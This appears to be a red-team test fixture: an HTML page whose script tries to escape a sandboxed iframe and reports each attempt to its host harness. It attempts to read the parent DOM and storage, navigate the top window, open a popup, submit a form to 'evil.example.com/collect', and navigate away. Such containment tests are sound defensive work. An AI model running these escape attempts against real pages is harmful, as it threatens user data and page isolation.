<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; font-src data:; connect-src 'none'; frame-src 'none'; child-src 'none'; worker-src 'none'; media-src 'none'; form-action 'none'; base-uri 'none'">
  <style>body { background: #F6F0CF; color: #1C1B18; }</style>
</head>
<body>
  <main class="zn-art" aria-labelledby="art-title">
    <h1 id="art-title">Red-team escape probe</h1>
    <p class="zn-art-read" aria-live="polite">probing</p>
  </main>
  <script>
    // NOT a build product: the DET-PL03-SANDBOX attack simulator. It runs in
    // the real sandboxed iframe and reports every attempt through the harness
    // channel; the host page asserts containment from its own side.
    (function () {
      'use strict';
      var attempts = {};

      function done() {
        window.parent.postMessage({
          source: 'zivon-artifact', v: 1, type: 'state',
          summary: JSON.stringify(attempts)
        }, '*');
      }

      // 1. parent DOM read
      try {
        var t = window.parent.document.title;
        attempts.parent_dom_read = t === 'host' ? 'READ' : 'read:' + t;
      } catch (e) { attempts.parent_dom_read = 'blocked'; }

      // 2. parent-side storage (opaque origin: no storage at all)
      try {
        window.parent.localStorage.getItem('x');
        attempts.parent_storage_read = 'READ';
      } catch (e) { attempts.parent_storage_read = 'blocked'; }

      // 3. top navigation (sandbox without allow-top-navigation)
      try {
        window.top.location.href = 'https://evil.example.com/top';
        attempts.top_navigation = 'NAVIGATED';
      } catch (e) { attempts.top_navigation = 'blocked'; }

      // 4. popup (sandbox without allow-popups)
      try {
        var popup = window.open('https://evil.example.com/popup');
        attempts.popup_open = popup ? 'OPENED' : 'blocked';
      } catch (e) { attempts.popup_open = 'blocked'; }

      // 5. form submission (sandbox without allow-forms): the attempt is
      //    reported; whether the frame actually navigates is proven by the
      //    host page (iframe URL + load count).
      attempts.form_submit = 'attempted';
      try {
        var f = document.createElement('form');
        f.action = 'https://evil.example.com/collect';
        document.body.appendChild(f);
        f.submit();
      } catch (e) { attempts.form_submit = 'blocked'; }

      // Report BEFORE the self-navigation attempt: a successful foreign
      // navigation would replace this document and kill the reporting.
      attempts.self_navigation_foreign = 'attempted';
      done();

      // 6. self-navigation to a foreign document (CSP + the host's
      //    second-load contract must contain it; the attempt is reported
      //    above and containment is proven host-side).
      try {
        window.location.href = 'https://evil.example.com/next';
      } catch (e) { /* reported as attempted either way */ }
    })();
  </script>
</body>
</html>
